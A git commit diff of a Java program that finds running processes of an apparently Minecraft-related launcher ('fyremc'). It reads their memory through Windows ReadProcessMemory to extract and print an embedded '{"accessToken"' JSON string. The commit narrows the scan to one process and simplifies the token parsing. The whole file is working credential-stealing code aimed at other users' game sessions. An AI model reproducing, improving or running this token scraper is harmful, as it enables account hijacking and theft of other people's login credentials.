83f29bb5cc950870e1f363a189167e62e0f863f4
BotiPro2007 <boti@evonit.hu>
2023-01-15 16:09:43 +0100

    Szivesen

--- src/main/java/azahriah/nemhibas/jdktest/Main.java
+++ src/main/java/azahriah/nemhibas/jdktest/Main.java
@@ -5,12 +5,12 @@ import azahriah.nemhibas.jdktest.natives.windows.kernel32._MEMORY_BASIC_INFORMAT
 import jdk.incubator.foreign.*;
 
 import java.nio.charset.StandardCharsets;
+import java.util.Comparator;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
 public class Main {
-    private static final int CHUNK_SIZE = 32;
-    private static final int JSON_BUFFER_SIZE = 512;
+    private static final int CHUNK_SIZE = 512;
 
     public static void main(String[] args) {
         System.out.println("Porog a fornettigyar");
@@ -18,6 +18,8 @@ public class Main {
 
         ProcessHandle.allProcesses()
                 .filter(proc -> proc.info().command().orElse("").toLowerCase().contains("fyremc"))
+                .sorted(Comparator.comparingDouble(proc->proc.info().startInstant().get().getNano()))
+                .limit(1)
                 .forEach(proc -> {
                     executor.execute(() -> {
                         String res = tryFindAccessToken(proc.pid());
@@ -25,13 +27,6 @@ public class Main {
                             System.out.println("[!] Found something in " + proc.pid() + " (P): " + res.split("\0")[0]);
                         }
                     });
-
-                    proc.children().forEach(child -> executor.execute(() -> {
-                        String res = tryFindAccessToken(child.pid());
-                        if (!res.isEmpty()) {
-                            System.out.println("[!] Found something in " + proc.pid() + ": " + res.split("\0")[0]);
-                        }
-                    }));
                 });
 
         executor.shutdown();
@@ -60,18 +55,8 @@ public class Main {
 
                             if (Kernel32.ReadProcessMemory(handle, readPointer, buffer, CHUNK_SIZE, MemoryAddress.NULL) != 0) {
                                 String bufferString = new String(buffer.toByteArray(), StandardCharsets.US_ASCII);
-
-                                if (bufferString.contains("{\"access")) {
-                                    buffer = segmentAllocator.allocateArray(CLinker.C_CHAR, JSON_BUFFER_SIZE);
-
-                                    if (Kernel32.ReadProcessMemory(handle, readPointer, buffer, JSON_BUFFER_SIZE, MemoryAddress.NULL) != 0) {
-                                        bufferString = new String(buffer.toByteArray(), StandardCharsets.US_ASCII);
-
-                                        int idx = bufferString.indexOf("{\"accessToken\":\"");
-                                        if (idx != -1) {
-                                            return bufferString.substring(idx, bufferString.length() - idx);
-                                        }
-                                    }
+                                if (bufferString.contains("{\"acc")){
+                                    return bufferString.substring(bufferString.indexOf("{"), bufferString.indexOf("}")+2);
                                 }
                             }
                         }
